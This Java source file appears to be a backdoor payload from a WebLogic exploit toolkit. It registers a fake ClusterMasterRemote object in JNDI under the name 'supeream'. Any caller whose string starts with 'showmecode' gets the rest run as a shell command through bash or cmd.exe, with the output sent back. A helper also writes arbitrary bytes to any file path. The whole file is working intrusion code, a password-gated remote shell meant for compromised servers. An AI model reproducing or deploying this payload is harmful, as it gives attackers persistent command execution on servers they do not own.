package com.supeream.payload;

import sun.tools.asm.TryData;
import weblogic.cluster.singleton.ClusterMasterRemote;
import weblogic.utils.encoders.BASE64Decoder;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.io.BufferedReader;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.rmi.RemoteException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

/**
 * Created by nike on 17/6/27.
 */

public class RemoteImpl implements ClusterMasterRemote {

    public static void main(String[] args) {

        try {
            RemoteImpl remote = new RemoteImpl();

            if (args.length == 2 && args[0].equalsIgnoreCase("blind")) {
                remote.getServerLocation(args[1]);
            } else if (args.length == 1) {
                Context ctx = new InitialContext();
                if (args[0].equalsIgnoreCase("install")) {
                    ctx.rebind("supeream", remote);
                } else if (args[0].equalsIgnoreCase("uninstall")) {
                    ctx.unbind("supeream");
                }
            }
        } catch (Exception e) {

        }
    }


    @Override
    public void setServerLocation(String cmd, String args) throws RemoteException {

    }

    public static void uploadFile(String path, byte[] content) {
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(path);
            fileOutputStream.write(content);
            fileOutputStream.flush();
            fileOutputStream.close();
        }catch (Exception e) {

        }
    }


    @Override
    public String getServerLocation(String cmd) throws RemoteException {
        try {

            if (!cmd.startsWith("showmecode")) {
                return "guess me?";
            } else {
                cmd = cmd.substring(10);
            }

            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }

            List<String> cmds = new ArrayList<String>();

            if (cmd.startsWith("$NO$")) {
                cmds.add(cmd.substring(4));
            }else if (isLinux) {
                cmds.add("/bin/bash");
                cmds.add("-c");
                cmds.add(cmd);
            } else {
                cmds.add("cmd.exe");
                cmds.add("/c");
                cmds.add(cmd);
            }

            ProcessBuilder processBuilder = new ProcessBuilder(cmds);
            processBuilder.redirectErrorStream(true);
            Process proc = processBuilder.start();

            BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            StringBuffer sb = new StringBuffer();

            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line).append("\n");
            }

            return sb.toString();
        } catch (Exception e) {
            return e.getMessage();
        }
    }
}
